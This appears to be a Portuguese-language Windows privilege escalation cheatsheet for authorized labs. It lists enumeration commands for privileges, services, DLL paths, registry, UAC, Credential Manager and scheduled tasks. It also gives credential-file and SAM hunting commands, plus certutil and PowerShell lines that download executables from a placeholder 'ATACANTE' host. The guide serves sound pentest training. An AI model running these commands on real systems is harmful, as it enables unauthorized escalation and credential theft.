# Windows Privilege Escalation — Cheatsheet

> Enum/check densos pos-foothold. Labs e engagements autorizados apenas.

**Credito:** Adaptado (MIT) do material HexSec / Leonardo Tamiano — reescrito em portugues. Sem links de video.

**Disclaimer:** VMs/labs proprios, THM/HTB/GOAD ou pentest com escopo escrito. Sem autorizacao, pare.

**Complementa:** [windows_privesc_teoria.md](windows_privesc_teoria.md) · [windows_privesc_metodologia.md](windows_privesc_metodologia.md)

---

## 1. Basico

```cmd
systeminfo
hostname & ver
whoami & whoami /all
set
echo %PATH%
where python & where powershell & where cmd
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic qfe get HotFixID,InstalledOn
```

```powershell
Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsArchitecture
$env:PATH -split ';'
Get-HotFix | Sort InstalledOn -Desc | Select -First 15
```

Anote: edicao, build, patches, dominio/workgroup, arch.

---

## 2. Sistema de arquivos

```cmd
dir /s /b C:\Users\*.kdbx 2>nul
dir /s /b C:\Users\*pass* C:\Users\*cred* 2>nul
dir /s /b C:\inetpub\wwwroot\*.config 2>nul
dir /s /b C:\*.env 2>nul
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul
dir /s /b C:\Users\*\Documents\*transcript* C:\Transcripts\* 2>nul
```

```powershell
Get-ChildItem C:\Users,C:\Temp,C:\inetpub -Recurse -Include *.kdbx,*.txt,*.xml,*.config,*.env -EA SilentlyContinue |
  Select FullName,Length,LastWriteTime
$h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $h) { Get-Content $h -Tail 80 }
Get-ChildItem C:\Users -Recurse -Filter ConsoleHost_history.txt -EA SilentlyContinue |
  % { "`n=== $($_.FullName) ==="; Get-Content $_.FullName -Tail 40 }
```

**Hives (paths):**
```
SAM/SYSTEM/SECURITY/SOFTWARE → C:\Windows\System32\config\
Backup/legado: C:\Windows\Repair\  |  RegBack: C:\Windows\System32\config\RegBack\
```

```cmd
dir C:\Windows\System32\config\SAM & icacls C:\Windows\System32\config\SAM
dir C:\Windows\Repair 2>nul & dir C:\Windows\System32\config\RegBack 2>nul
```

Dump/extract so em lab autorizado (SeBackup / Backup Operators).

---

## 3. Usuarios / privilegios

```cmd
whoami /priv
whoami /groups
net user & net user %USERNAME%
net localgroup & net localgroup Administrators
net localgroup "Backup Operators"
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"
net accounts
icacls C:\ & icacls "C:\Program Files" & icacls C:\Users
wmic useraccount get Name,SID
wmic group get Name,SID
```

```powershell
Get-LocalUser | ft Name,Enabled,LastLogon
Get-LocalGroup | ft Name
Get-LocalGroupMember Administrators
Get-LocalGroupMember "Backup Operators" -EA SilentlyContinue
whoami /groups | findstr /i Mandatory
Get-Acl C:\ | fl
Get-CimInstance Win32_UserAccount -Filter "LocalAccount=True" | Select Name,SID,Disabled
```

**Privs-chave:** `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`.

`Enabled` = ativo · `Disabled` = no token · ausente = irrelevante aqui.

---

## 4. Transferencia de arquivos (lab)

Sem reverse shells custom. So ferramentas do lab.

```cmd
certutil -urlcache -split -f http://ATACANTE/arquivo.exe C:\Users\Public\arquivo.exe
certutil -hashfile C:\Users\Public\arquivo.exe SHA256
```

```powershell
iwr http://ATACANTE/arquivo.exe -OutFile C:\Users\Public\arquivo.exe
(New-Object Net.WebClient).DownloadFile("http://ATACANTE/winPEASx64.exe","C:\Users\Public\winPEAS.exe")
Get-FileHash C:\Users\Public\arquivo.exe -Algorithm SHA256
```

---

## 5. SeImpersonate / SeBackup

```cmd
whoami /priv
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken SeBackup SeRestore SeDebug"
```

| Privilegio | Ferramentas tipicas (lab) |
|------------|---------------------------|
| SeImpersonate / SeAssignPrimaryToken | PrintSpoofer, GodPotato, SweetPotato, JuicyPotatoNG, RoguePotato |
| SeBackup / SeRestore | backup APIs / dump de hives (binario do lab) |
| SeDebug | acesso a processos privilegiados (EDR!) |

Usar binario do lab para executar comando **local** (`whoami`). Nao incluir payloads de reverse shell.

```
Conceito (path/binario do seu lab):
  PrintSpoofer.exe -c "whoami"
  GodPotato.exe -cmd "cmd /c whoami"
```

---

## 6. Servicos

```cmd
sc query state= all
sc qc SERVICENAME
sc sdshow SERVICENAME
wmic service get Name,PathName,StartName,StartMode
wmic service get Name,PathName,StartName,StartMode | findstr /i /v "C:\Windows\\"
icacls "C:\Path\To\service.exe"
accesschk.exe -uwcqv %USERNAME% *
winPEASx64.exe quiet servicesinfo
```

```powershell
Get-Service | Sort Status,Name
Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName | ft -Auto
# Unquoted candidatos
Get-CimInstance Win32_Service |
  ? { $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
  Select Name,PathName,StartName,StartMode,State
Get-Acl "C:\Path\To\ServiceFolder" | fl
```

Checklist unquoted: sem aspas + espaco + dir intermediario gravavel + restart/auto.
Procurar ACL: `SERVICE_CHANGE_CONFIG`, Modify no binario/pasta, `StartName=LocalSystem`.

---

## 7. Programas / processos

```cmd
tasklist /v & tasklist /svc
wmic process get Name,ProcessId,ExecutablePath,CommandLine
wmic product get Name,Version
echo %PATH%
```

```powershell
Get-Process | Sort CPU -Desc | Select -First 25 Name,Id,Path
Get-CimInstance Win32_Process | Select ProcessId,Name,ExecutablePath,CommandLine
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* ,
  HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
  ? DisplayName | Select DisplayName,DisplayVersion | Sort DisplayName
Get-ChildItem "C:\Program Files","C:\Program Files (x86)" -EA SilentlyContinue | Select Name
```

Cruzar versoes com CVEs locais do lab. Priorizar processos/servicos SYSTEM.

---

## 8. DLL hijacking — conceito + enum

Ordem de busca (SafeDllSearchMode ON, simplificada):

```
1. Dir do aplicativo
2. System32
3. 16-bit system (legado)
4. Windows dir
5. CWD
6. PATH
```

Vetor: pasta gravavel no caminho + processo privilegiado carregando DLL pelo nome.

```cmd
tasklist /m
wmic process where "name='alvo.exe'" get ProcessId,ExecutablePath,CommandLine
icacls "C:\Path\Do\App"
echo %PATH%
```

```powershell
Get-CimInstance Win32_Process -Filter "Name='alvo.exe'" | Select ProcessId,ExecutablePath,CommandLine
$env:PATH -split ';' | ? { Test-Path $_ } | % {
  $a=(Get-Acl $_).Access | ? {
    $_.IdentityReference -match "$env:USERNAME|Users|Authenticated|Everyone" -and
    $_.FileSystemRights -match "Write|Modify|FullControl"
  }
  if ($a) { [pscustomobject]@{Path=$_; Access=$a} }
}
```

So conceito + enum. Sem codigo C completo de DLL maliciosa.

---

## 9. Registry (leitura / enum)

### AlwaysInstallElevated — CHECK

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -EA SilentlyContinue
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -EA SilentlyContinue
```

Se **ambos** HKLM/HKCU = `1`: vetor confirmado — explorar so em lab. Sem msfvenom/MSI aqui.

### ImagePath, AppInit, Run, Winlogon

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services\SERVICENAME /v ImagePath
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
```

```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\SERVICENAME | Select ImagePath,ObjectName,Start
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" | Select AppInit_DLLs,LoadAppInit_DLLs
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select Userinit,Shell
```

Foque em leitura/enum e paths gravaveis.

---

## 10. UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken
whoami /groups | findstr /i Mandatory
```

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System |
  Select EnableLUA,ConsentPromptBehaviorAdmin,ConsentPromptBehaviorUser,FilterAdministratorToken
```

| ConsentPromptBehaviorAdmin | Significado |
|----------------------------|-------------|
| 0 | Elevate sem prompt (fraco) |
| 1 | Prompt credenciais (secure desktop) |
| 2 | Prompt consent (secure desktop; tipico Pro) |
| 3 / 4 | Prompt credenciais / consent |
| 5 | Prompt consent p/ nao-Windows (comum) |

`EnableLUA=0` → UAC off. Bypass UAC = Medium→High se ja admin; nao e PrivEsc de user comum.

---

## 11. Hashes / Credential Manager

```cmd
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all
```

```powershell
cmdkey /list
Get-ChildItem C:\Users -Recurse -Include *.rdp,*.cred,*.pfx,*.kdbx -EA SilentlyContinue |
  Select FullName,Length,LastWriteTime
```

Credential Manager/vault = secrets do usuario. LSASS/SAM dump so em lab com RoE.

---

## 12. Scheduled tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /tn "\NomeDaTask" /fo LIST /v
dir C:\Windows\System32\Tasks & dir C:\Windows\Tasks
icacls "C:\Path\Do\Script.ps1"
```

```powershell
Get-ScheduledTask | % {
  $i=$_|Get-ScheduledTaskInfo -EA SilentlyContinue; $a=$_.Actions
  [pscustomobject]@{Task=$_.TaskName; State=$_.State; RunAs=$_.Principal.UserId;
    Execute=$a.Execute; Args=$a.Arguments; Last=$i.LastRunTime}
} | ft -Auto
```

Checklist: SYSTEM/Admin + binario/script gravavel + trigger frequente.

---

## 13. Scripts de enum (quiet)

| Tool | Uso tipico |
|------|------------|
| WinPEAS | `winPEASx64.exe quiet` · `quiet servicesinfo` |
| Seatbelt | `Seatbelt.exe -group=all` · `-group=system` |
| PowerUp | `Import-Module .\PowerUp.ps1; Invoke-AllChecks` |
| SharpUp | `SharpUp.exe audit` |

```cmd
winPEASx64.exe quiet
Seatbelt.exe -group=all -outputfile=C:\Users\Public\seatbelt.txt
SharpUp.exe audit
```

```powershell
Import-Module .\PowerUp.ps1; Invoke-AllChecks
```

---

## Ordem rapida

```
whoami /priv → servicos/ACL → arquivos/history → tasks/registry/UAC
      |              |                |                  |
 SeImpersonate  unquoted/weak   .kdbx/cmdkey/SAM   AlwaysInstallElevated
```

---

## MITRE ATT&CK

| ID | Tecnica |
|----|---------|
| T1068 | Exploitation for Privilege Escalation |
| T1134 / T1134.001 | Access Token Manipulation / Impersonation |
| T1548 / T1548.002 | Abuse Elevation Control / Bypass UAC |
| T1543.003 | Windows Service |
| T1574.001 | DLL Search Order Hijacking |
| T1574.009 | Unquoted Path |
| T1053.005 | Scheduled Task |
| T1003 / .001 / .002 | OS Credential Dumping / LSASS / SAM |
| T1555.004 | Windows Credential Manager |
| T1012 | Query Registry |
| T1082 / T1083 / T1033 | System / File / User Discovery |
| T1047 | WMI |
| T1105 | Ingress Tool Transfer |
| T1078 | Valid Accounts |

**Refs:** [teoria](windows_privesc_teoria.md) · [metodologia](windows_privesc_metodologia.md) · [lateral](windows_lateral_movement_teoria.md) · [PS](powershell_cheatsheet.md)
